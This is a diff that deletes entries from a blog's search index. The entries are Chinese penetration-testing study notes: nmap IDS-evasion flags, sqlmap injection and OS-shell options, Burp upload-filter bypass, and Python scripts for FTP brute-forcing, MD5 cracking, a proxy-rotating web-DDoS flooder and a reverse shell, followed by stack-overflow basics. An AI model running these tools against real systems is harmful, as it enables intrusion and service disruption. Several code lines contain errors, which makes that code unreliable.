@@ -1,355 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>LINUX-PENETRATION</title>
-    <url>/2021/12/25/LINUX-PENETRATION/</url>
-    <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
-<li>IDS（Intrusion Detection Systems）入侵检测系统</li>
-<li>NMAP逃逸方案：<ol>
-<li>报文分段：<code>nmap -f [IP]</code> &#x2F;&#x2F;将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难</li>
-<li>指定最大传输单元（MTU,Maximum Transmission Unit）：<code>nmap --mtu [num] [IP]</code> 设定TCP&#x2F;IP协议传输数据时最大传输单元，有效实现逃逸</li>
-<li>隐蔽扫描：<code>nmap -D RND:[num] [IP]</code> “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）</li>
-<li>源地址欺骗：<code>nmap -sI [www.baidu.com:80] [IP]</code> 伪造一个地址作为发起扫描的源地址</li>
-<li>源端口欺骗：<code>nmap --source-port [num] [IP]</code> 指定一个随机端口，通过该端口发送数据</li>
-<li>MAC地址欺骗：<code>nmap -sT --spoof-mac [MAC] [IP]</code></li>
-<li>附加随机数据：<code>nmap --data-length [num] [IP]</code> 参杂一些随机数据影响防火墙判断</li>
-</ol>
-</li>
-</ol>
-<h2 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h2><h3 id="1-信息收集脚本"><a href="#1-信息收集脚本" class="headerlink" title="1. 信息收集脚本"></a>1. 信息收集脚本</h3><ol>
-<li>IP信息：<code>nmap --script ip-geolocation-* [IP]</code></li>
-<li>Whois：<code>nmap --script whois [site]</code></li>
-<li>IP反查：<code>nmap --script hostmap-ip2hosts [site]</code></li>
-</ol>
-<h3 id="2-漏洞扫描脚本"><a href="#2-漏洞扫描脚本" class="headerlink" title="2. 漏洞扫描脚本"></a>2. 漏洞扫描脚本</h3><ol>
-<li>windows系统主机漏洞扫描：<code>nmap --script smb-check-vulns.nse -p [IP]</code></li>
-<li>web漏洞扫描：<code>nmap -sV --script=vulscan/vulscan.nse [IP]</code> Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（<a href="http://www.computec.ch/projekte/vulscan/?s=download" title="http://www.computec.ch/projekte/vulscan/?s=download">脚本地址</a>存放于目录\nmap\scripts\下）</li>
-</ol>
-<h3 id="3-渗透测试脚本"><a href="#3-渗透测试脚本" class="headerlink" title="3. 渗透测试脚本"></a>3. 渗透测试脚本</h3><ol>
-<li>FTP服务审计：<code>nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]</code> 通过设定的字典对FTP爆破</li>
-<li>Wordpress密码审计：<code>nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]</code> &#x2F;&#x2F; 可通过设定线程数量提高破解速度：<code>--script-args http-wordpress.threads=[num]</code></li>
-<li>数据库安全审计：<code>nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]</code> (MySQL操作一致)</li>
-</ol>
-<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
-<li><code>sqlmap -u URL --tables</code></li>
-</ol>
-<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><ol>
-<li>实质：使用了ASP一类的动态脚本实现</li>
-<li>存在漏洞位置加 “ * ”：<code>sqlmap -u URL/id/40*.html --dbs</code></li>
-</ol>
-<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
-<li>产生来源：request方法，用户可从提交的参数中获取参数值</li>
-<li><code>sqlmap -u &quot;http://xxx.xxx.xxx/shownews.asp&quot; --cookie &quot;id=25&quot; --tables --level 2</code><ol>
-<li>将URL分段</li>
-<li>使用<code>--cookie</code>进行连接</li>
-<li>设置<code>--level</code>等级2级以上</li>
-</ol>
-</li>
-</ol>
-<h2 id="POST类型注入"><a href="#POST类型注入" class="headerlink" title="POST类型注入"></a>POST类型注入</h2><ol>
-<li>产生来源：（搜索框、登录框）对POST过滤不严</li>
-<li>操作步骤：<ol>
-<li>方法一：<ol start="2">
-<li>获取表单信息进行分析：找出输入框对应参数变量</li>
-<li>使用<code>--data</code>指定注入点：<code>sqlmap -u http://xxx/Login.asp --data &quot;[Name]=1&amp;[Password]=1&quot;</code></li>
-</ol>
-</li>
-<li>方法二：<ol>
-<li>使用<code>--forms</code>sqlmap自动获取相关信息，查看输出结果<code>Payload:</code>处：<code>sqlmap -u http://domain/Login.asp --forms</code></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h2 id="防火墙逃逸"><a href="#防火墙逃逸" class="headerlink" title="防火墙逃逸"></a>防火墙逃逸</h2><ol>
-<li>方案一：<code>--delay 1</code>使用延迟方法逃逸</li>
-<li>方案二：<code>--tamper &quot;xxx.py&quot;</code>执行逃逸脚本（默认脚本位置：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;）</li>
-</ol>
-<h2 id="命令执行与维持访问"><a href="#命令执行与维持访问" class="headerlink" title="命令执行与维持访问"></a>命令执行与维持访问</h2><ol>
-<li>产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制</li>
-<li><code>--os-cmd=xxx</code></li>
-<li><code>--os-shell</code></li>
-</ol>
-<h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><h3 id="1-proxy-gt-gt-Intercept"><a href="#1-proxy-gt-gt-Intercept" class="headerlink" title="1. proxy&gt;&gt;Intercept"></a>1. proxy&gt;&gt;Intercept</h3><ol>
-<li>forwar</li>
-<li>drop：放弃当前数据</li>
-<li>intercept is on&#x2F;off：开关</li>
-<li>Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息</li>
-<li>Params：GET请求、POST请求、Cookie参数</li>
-<li>Hex：显示Raw选项的16进制内容</li>
-</ol>
-<h3 id="2-密码安全审计（Intruder）"><a href="#2-密码安全审计（Intruder）" class="headerlink" title="2. 密码安全审计（Intruder）"></a>2. 密码安全审计（Intruder）</h3><ol>
-<li>Action &gt;&gt; Send to Intruder</li>
-<li>Positions:<ol>
-<li>Add$：选中内容设置为变量</li>
-<li>Clean$：重置变量</li>
-<li>Auto$：自动选取变量</li>
-<li>Refresh</li>
-<li>Attack type:<ol>
-<li>Sniper：适合只有一个变量，每次填入一个参数进行审计</li>
-<li>Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计</li>
-<li>Pitchfork：在两个字典文件中提取一对或一个值覆盖变量</li>
-<li>Cluster bomb：使用两个字典进行排列组合并进行审计</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>Payloads：设置payload模式，配置字典</li>
-<li>start attack：观察len长度，进行筛选</li>
-</ol>
-<h3 id="3-重放攻击"><a href="#3-重放攻击" class="headerlink" title="3. 重放攻击"></a>3. 重放攻击</h3><ol>
-<li>intruder 传递审计结果到 repeater ：重放发送，查看响应内容</li>
-<li>proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）<ul>
-<li>扩展名验证：<code>filename=&quot;xxx.php&quot;</code></li>
-<li>MINI类型验证：<code>Content-Type:</code>2. 文件头校验&#x2F;文件完整性验证：插入真实的[图片文件]</li>
-</ul>
-</li>
-</ol>
-<h3 id="4-响应比较"><a href="#4-响应比较" class="headerlink" title="4. 响应比较"></a>4. 响应比较</h3><ol>
-<li>Comparer：自动高亮功能方便比较</li>
-</ol>
-<h3 id="5-Web漏洞脚本安全审计：Taget-gt-gt-scan"><a href="#5-Web漏洞脚本安全审计：Taget-gt-gt-scan" class="headerlink" title="5. Web漏洞脚本安全审计：Taget &gt;&gt; scan"></a>5. Web漏洞脚本安全审计：Taget &gt;&gt; scan</h3><h3 id="6-cookie安全性随机分析：Sequencer"><a href="#6-cookie安全性随机分析：Sequencer" class="headerlink" title="6. cookie安全性随机分析：Sequencer"></a>6. cookie安全性随机分析：Sequencer</h3><h3 id="7-编码解码器：Decoder"><a href="#7-编码解码器：Decoder" class="headerlink" title="7. 编码解码器：Decoder"></a>7. 编码解码器：Decoder</h3><h3 id="8-第三方模块：Extender"><a href="#8-第三方模块：Extender" class="headerlink" title="8. 第三方模块：Extender"></a>8. 第三方模块：Extender</h3><h1 id="BeFF测试Xss漏洞"><a href="#BeFF测试Xss漏洞" class="headerlink" title="BeFF测试Xss漏洞"></a>BeFF测试Xss漏洞</h1><h1 id="Develop-Penetration-Tools"><a href="#Develop-Penetration-Tools" class="headerlink" title="Develop Penetration Tools"></a>Develop Penetration Tools</h1><h2 id="1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）"><a href="#1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）" class="headerlink" title="1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）"></a>1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ftplib import FTP</span><br><span class="line">def ftp_login(host,username,password)</span><br><span class="line">    try:</span><br><span class="line">        ftp=FTP()</span><br><span class="line">        ftp.connect(host,21)</span><br><span class="line">        ftp.login(username,password)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(&quot;[+]Sucess Password:&quot;,password)</span><br><span class="line">    except:</span><br><span class="line">            pass</span><br><span class="line">def ftp_try(host,username,password):</span><br><span class="line">    for i in open(password):</span><br><span class="line">        ftp_login(host,username,i.strip())</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    ftp_try(&#x27;192.168.0.1&#x27;,&#x27;admin&#x27;,&#x27;/home/password.txt&#x27;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-MD5破解程序（彩虹表碰撞、穷举法）"><a href="#2-MD5破解程序（彩虹表碰撞、穷举法）" class="headerlink" title="2. MD5破解程序（彩虹表碰撞、穷举法）"></a>2. MD5破解程序（彩虹表碰撞、穷举法）</h2><ol>
-<li><p>python提供了hashlib模块，对明文进行MD5加密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hshlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(&#x27;Python&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(md5.hexidigest())</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。</p>
-<ol>
-<li>hashlib加密明文</li>
-<li>datatime计算程序运行时间</li>
-<li>sys获取输入的密文</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import datetime</span><br><span class="line">import sys</span><br><span class="line">name=sys.argv[1]</span><br><span class="line">starttime=datetime.datetime.now()</span><br><span class="line">for i in open(r&#x27;C:/123.txt&#x27;):</span><br><span class="line">    rs=i.strip()</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(rs.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    newmd5 = md5.hexdigest()</span><br><span class="line">    if newmd5 == name:</span><br><span class="line">        print(&quot;解密成功！明文是：&quot;,rs)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(endtime-starttime)      </span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="3-Web密码安全审计工具"><a href="#3-Web密码安全审计工具" class="headerlink" title="3. Web密码安全审计工具"></a>3. Web密码安全审计工具</h2><h2 id="4-ChallengeCallapsar压力测试（CC：WEB-DDOS）"><a href="#4-ChallengeCallapsar压力测试（CC：WEB-DDOS）" class="headerlink" title="4. ChallengeCallapsar压力测试（CC：WEB DDOS）"></a>4. ChallengeCallapsar压力测试（CC：WEB DDOS）</h2><ol>
-<li><p>原理：多线程模拟多合法用户，确保有大量可用的代理地址</p>
-</li>
-<li><p>操作思路：</p>
-<ol>
-<li><p>引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">import threading</span><br><span class="line">url = &quot;http://www.xxxx.com/&quot;</span><br><span class="line">proxies=[&quot;114.xxx.xxx.xx:xxxx&quot;,&quot;xxx.xxx.xxx.xxx:xxxx&quot;,&quot;xxx.xxx.xxx:xxxx&quot;]</span><br><span class="line">class cc(threading.Thread):</span><br><span class="line">def __init__(self,url,proxies):</span><br><span class="line">  super(cc,self).__init__()</span><br><span class="line">  self.url=url</span><br><span class="line">  self.proxies=proxies</span><br><span class="line">  self.start()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>CC函数定义</p>
-<ol>
-<li>request.ProxyHandler()函数设置代理服务器</li>
-<li>build_opener()函数创建自定义Opener对象</li>
-<li>Install_opener()函数创建opener</li>
-<li>可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># class cc(threading,Thread):</span><br><span class="line">def run(self):</span><br><span class="line">while True:</span><br><span class="line">  try:</span><br><span class="line">      pro_random = random.choice(self.proxies)</span><br><span class="line">      pro_support = request.ProxyHandler(&#123;&quot;http&quot;:pro_random&#125;)</span><br><span class="line">      opener = request.build_opener(pro_support)</span><br><span class="line">      request.install_opener(opener)</span><br><span class="line">      request.urlopen(self.url)</span><br><span class="line">  except:</span><br><span class="line">          pass</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行循环</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5000):</span><br><span class="line">cc(url.proxies)</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-<h2 id="5-后渗透（维持访问）：TCP反向连接"><a href="#5-后渗透（维持访问）：TCP反向连接" class="headerlink" title="5. 后渗透（维持访问）：TCP反向连接"></a>5. 后渗透（维持访问）：TCP反向连接</h2><ol>
-<li><p>服务端：</p>
-<ol>
-<li>导入socket模块</li>
-<li>安装并绑定套接字，允许最大连接数100，超出则拒绝</li>
-<li>通过一个while循环来接受并发送用户执行的命令</li>
-<li>将结果接收回来并打印</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;&#x27;,1234))</span><br><span class="line">s.listen(100)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">while 1:</span><br><span class="line"> command = input(&#x27;......&gt;&#x27;)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     conn.send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     if command == &#x27;&#x27;:</span><br><span class="line">         continue</span><br><span class="line">     conn,send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     result = conn.recv(1024)</span><br><span class="line">     print(result.decode(&#x27;gbk&#x27;,&#x27;ignore&#x27;))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>客户端</p>
-<ol>
-<li>使用subprocess执行获得的用户命令</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess as sp,sys,re</span><br><span class="line">conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">conn.connect((&#x27;127.0.0.1&#x27;,1234))</span><br><span class="line">while 1:</span><br><span class="line"> command = conn.renv(1024)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     sh = sp.Popen(command.decode(&#x27;gbk&#x27;),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)</span><br><span class="line">     out,err=sh.communicate()</span><br><span class="line">     conn.send(out)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>WEB渗透</category>
-        <category>LINUX</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>Linux</tag>
-        <tag>网络空间安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ODAY-软件漏洞分析</title>
-    <url>/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">一、基础知识</a><ul>
-<li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li>
-<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">逆向分析工具</a></li>
-</ul>
-</li>
-<li><a href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">二、漏洞利用</a><ul>
-<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">栈溢出利用</a><ul>
-<li><a href="#1-%E7%B3%BB%E7%BB%9F%E6%A0%88">1. 系统栈</a><ul>
-<li><a href="#%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E6%8C%89%E5%8A%9F%E8%83%BD%E5%88%92%E5%88%86">进程使用的内存区域按功能划分</a></li>
-<li><a href="#win32%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8%E7%94%A8%E4%BA%8E%E6%A0%87%E8%AF%86%E4%BD%8D%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%A0%88%E6%A0%88%E9%A1%B6%E7%9A%84%E6%A0%88%E5%B8%A7">Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</a></li>
-<li><a href="#%E4%B8%8D%E5%90%8C%E7%BC%96%E8%AF%91%E5%99%A8%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E5%B7%AE%E5%BC%82">不同编译器调用方式差异</a></li>
-<li><a href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数调用大致步骤：</a></li>
-<li><a href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数返回大致步骤：</a></li>
-<li><a href="#%E6%89%A9%E5%85%85%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E4%B9%A6%E7%B1%8Dibm-x86%E6%B1%87%E7%BC%96%E6%88%96win32%E6%B1%87%E7%BC%96">+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</a></li>
-</ul>
-</li>
-<li><a href="#2-%E4%BF%AE%E6%94%B9%E9%82%BB%E6%8E%A5%E5%8F%98%E9%87%8F">2. 修改邻接变量</a></li>
-<li><a href="#3-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80">3. 修改函数返回地址</a></li>
-<li><a href="#4-%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5">4. 代码植入</a></li>
-</ul>
-</li>
-<li><a href="#%E5%BC%80%E5%8F%91shellcode">开发shellcode</a></li>
-<li><a href="#metasploit%E5%BC%80%E5%8F%91exploit">MetaSploit开发Exploit</a></li>
-<li><a href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">堆溢出利用</a></li>
-<li><a href="#windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">Windows异常处理机制</a></li>
-<li><a href="#%E9%AB%98%E7%BA%A7%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">高级内存攻击技术</a></li>
-<li><a href="#%E6%89%8B%E6%9C%BA%E9%87%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">手机里的缓冲区溢出</a></li>
-<li><a href="#%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF">其他软件漏洞利用技术</a></li>
-<li><a href="#windows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">Windows安全机制</a></li>
-<li><a href="#gs">GS</a></li>
-<li><a href="#safeseh">SafeSEH</a></li>
-<li><a href="#dep">DEP</a></li>
-<li><a href="#aslr">ASLR</a></li>
-<li><a href="#sehop">SEHOP</a></li>
-<li><a href="#%E5%A0%86%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%94%BB%E5%87%BB">堆保护与攻击</a></li>
-</ul>
-</li>
-<li><a href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">三、漏洞挖掘</a></li>
-<li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">四、漏洞分析</a></li>
-</ul>
-<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol>
-<li>BUG：功能性逻辑缺陷</li>
-<li>漏洞：安全性逻辑缺陷（软件中缓冲区溢出漏洞、网站中跨站脚本xss漏洞、SQL注入漏洞等）</li>
-<li>0day响应：<ol>
-<li><a href="http://cve.mitre.org/" title="http://cve.mitre.org">CVE</a></li>
-<li><a href="http://www.cert.org/" title="http://www.cert.org">CERT</a></li>
-<li>微软安全中心”Black Tuesday“：每个月第二周星期二发布补丁</li>
-</ol>
-</li>
-<li><strong>PE文件格式</strong>：Win32平台下可执行文件遵守的数据格式（“*.exe” &#x2F; “*.dll”等）<ol>
-<li>.text：由编译器产生，存放二进制的机器码，是反汇编和调试的对象</li>
-<li>.data：初始化的数据块（如：宏定义、全局变量、静态变量等）</li>
-<li>.idata：可执行文件所使用的动态链接库等外来函数与文件的信息</li>
-<li>.rsrc：存放程序的资源（如图标、菜单等）</li>
-<li>.reloc 、.edata 、.tls 、.rdata</li>
-</ol>
-</li>
-<li><strong>“虚拟内存”</strong>（非操作系统中的虚拟内存）：在用户模式下，用调试器看到的内存地址 [指Windows用户态内存隐射机制下的虚拟内存]</li>
-<li><strong>PE文件与虚拟内存的映射</strong>：VA &#x3D; ImageBase + RVA<ol>
-<li>文件偏移地址（File Offset）</li>
-<li>装载基址（Image Base）</li>
-<li>虚拟内存地址（Virtual Address,VA）</li>
-<li>相对虚拟地址（Relative Virtual Address,RVA）</li>
-</ol>
-</li>
-</ol>
-<h2 id="逆向分析工具"><a href="#逆向分析工具" class="headerlink" title="逆向分析工具"></a>逆向分析工具</h2><ol>
-<li><p>OllyDbg</p>
-</li>
-<li><p>SoftICE</p>
-</li>
-<li><p>WinDbg</p>
-</li>
-<li><p>IDE Pro</p>
-</li>
-<li><p>二进制编辑器（Ultra Edit、Hex Workshop、WinHex）</p>
-</li>
-<li><p>虚拟机</p>
-</li>
-<li><p>Crack二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密码验证实验程序</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">   int authenticated;</span><br><span class="line">   authenticated=strcmp(password,PASSWORD);</span><br><span class="line">   return authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   int valid_flag = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h2><h3 id="1-系统栈"><a href="#1-系统栈" class="headerlink" title="1. 系统栈"></a>1. 系统栈</h3><ol>
-<li><h4 id="进程使用的内存区域按功能划分"><a href="#进程使用的内存区域按功能划分" class="headerlink" title="进程使用的内存区域按功能划分"></a>进程使用的内存区域<strong>按功能</strong>划分</h4><ol>
-<li>代码区：cpu在此区域取值执行</li>
-<li>数据区：存储全局变量等</li>
-<li>堆区：动态分配和回收。进程在堆区请求一定大小的内存</li>
-<li>栈区：用于动态地存储函数间的调用关系，保证被调用函数在返回时恢复到母函数继续执行。</li>
-</ol>
-</li>
-<li><h4 id="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"><a href="#Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧" class="headerlink" title="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"></a>Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</h4><ol>
-<li>ESP（<a href="extended_stack_pointer" title="extended_stack_pointer">栈指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的顶部</strong></li>
-<li>EBP（<a href="extended_base_pointer" title="extended_base_pointer">基址指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的底部</strong></li>
-<li>当前函数栈帧：ESP和EBP之间的内存空间<ol>
-<li>局部变量：为函数局部变量开辟内存空间</li>
-<li>栈帧状态值：保存前栈帧的顶部和底部，用于本栈帧弹出后恢复上一个栈帧（实际只保存底部，顶部可以通过堆栈平衡计算得出）</li>
-<li>函数返回地址：保存当前函数调用前的断点信息，也就是<strong>函数调用前的指令位置</strong></li>
-</ol>
-</li>
-<li>另外的特殊寄存器：EIP（指令寄存器）存放下一条等待执行的指令地址</li>
-</ol>
-</li>
-<li><h4 id="不同编译器调用方式差异"><a href="#不同编译器调用方式差异" class="headerlink" title="不同编译器调用方式差异"></a>不同编译器调用方式差异</h4></li>
-</ol>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>C</th>
-<th>SysCall</th>
-<th>StdCall</th>
-<th>BASIC</th>
-<th>FORTRAN</th>
-<th>PASCAL</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>参数入栈顺序</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-</tr>
-<tr>
-<td>恢复栈平衡操作的位置</td>
-<td>母函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-</tr>
-</tbody></table>
-<ol start="4">
-<li><h4 id="函数调用大致步骤："><a href="#函数调用大致步骤：" class="headerlink" title="函数调用大致步骤："></a>函数调用大致步骤：</h4><ol>
-<li>参数入栈：按入栈顺序</li>
-<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈，供函数返回时继续执行</li>
-<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口</li>
-<li>栈帧调整：<ol>
-<li>EBP入栈：保存当前栈帧状态值，以供后面恢复本栈帧时使用</li>
-<li>ESP装入EBP，更新栈帧底部：将当前栈帧切换到新栈帧</li>
-<li>把ESP减去所需空间的大小，太高栈顶：给新栈帧分配空间</li>
-</ol>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;假设函数有三个参数，依次入栈</span><br><span class="line">push canshu1    </span><br><span class="line">push canshu2    </span><br><span class="line">push canshu3    </span><br><span class="line">call 函数地址    ;call完成两项工作：a.保存返回地址（入栈当前指令在内存中的位置） b. 跳转到函数的入口地址</span><br><span class="line">push ebp    ;保存旧栈的栈底</span><br><span class="line">mov ebp ,esp    ;栈帧切换：新栈帧底替换旧栈底</span><br><span class="line">sub esp ,xxx    ;太高栈顶，为新栈帧开辟内存空间：设置新栈帧的栈顶</span><br></pre></td></tr></table></figure>
-</li>
-<li><h4 id="函数返回大致步骤："><a href="#函数返回大致步骤：" class="headerlink" title="函数返回大致步骤："></a>函数返回大致步骤：</h4><ol>
-<li>保存返回值：通常保存在寄存器EAX</li>
-<li>弹出当前栈帧，恢复上一个栈帧<ol>
-<li>在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收空间</li>
-<li>将（当前栈帧底部保存的）前栈帧EBP值 弹入 EBP寄存器，恢复出上一个栈帧</li>
-<li>将函数返回地址弹给EIP寄存器</li>
-</ol>
-</li>
-<li>跳转：按照返回地址跳回母函数继续执行</li>
-</ol>
